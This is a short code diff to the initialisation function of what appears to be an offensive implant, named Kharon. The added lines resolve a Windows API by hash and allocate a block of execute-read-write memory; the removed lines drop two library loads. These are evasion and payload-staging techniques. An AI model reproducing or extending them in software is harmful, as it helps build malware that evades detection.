@@ -89,9 +89,6 @@ auto DECLFN Kharon::Init(
     this->Ws2_32.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "ws2_32.dll" ) );
     this->Msvcrt.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "msvcrt.dll" ) );
 
-    Lib->Load( "secur32.dll" );
-    Lib->Load( "gdi.dll" );
-
     if ( !this->Mscoree.Handle   ) this->Mscoree.Handle   = Lib->Load( "mscoree.dll" );
     if ( !this->Advapi32.Handle  ) this->Advapi32.Handle  = Lib->Load( "advapi32.dll" );
     if ( !this->Wininet.Handle   ) this->Wininet.Handle   = Lib->Load( "wininet.dll" );
@@ -111,6 +108,8 @@ auto DECLFN Kharon::Init(
     RSL_IMP( Cryptbase );
     RSL_IMP( Ws2_32 );
     RSL_IMP( Msvcrt );
+
+    this->Ntdll.khRtlFillMemory = ( decltype( this->Ntdll.khRtlFillMemory ) )LdrLoad::_Api( this->Ntdll.Handle, Hsh::Str<CHAR>( "RtlFillMemory" ) );
 
     KhDbgz( "library kernel32.dll  loaded at %p and functions resolveds", this->Krnl32.Handle    );
     KhDbgz( "library ntdll.dll     loaded at %p and functions resolveds", this->Ntdll.Handle     );
@@ -167,10 +166,15 @@ auto DECLFN Kharon::Init(
 
     MemInfoEx.dwLength = sizeof( MEMORYSTATUSEX );
 
+    this->Machine.AllocGran = SysInfo.dwAllocationGranularity;
+    this->Machine.PageSize  = SysInfo.dwPageSize;
+
     this->Ntdll.NtQueryInformationProcess( 
         NtCurrentProcess(), ProcessBasicInformation, 
         &PsBasicInfoEx, sizeof( PsBasicInfoEx ), NULL 
     );
+
+    this->Mm->Alloc( nullptr, 0x1000, 0x3000, 0x40);
 
     this->Krnl32.GlobalMemoryStatusEx( &MemInfoEx );
     this->Krnl32.GetNativeSystemInfo( &SysInfo );
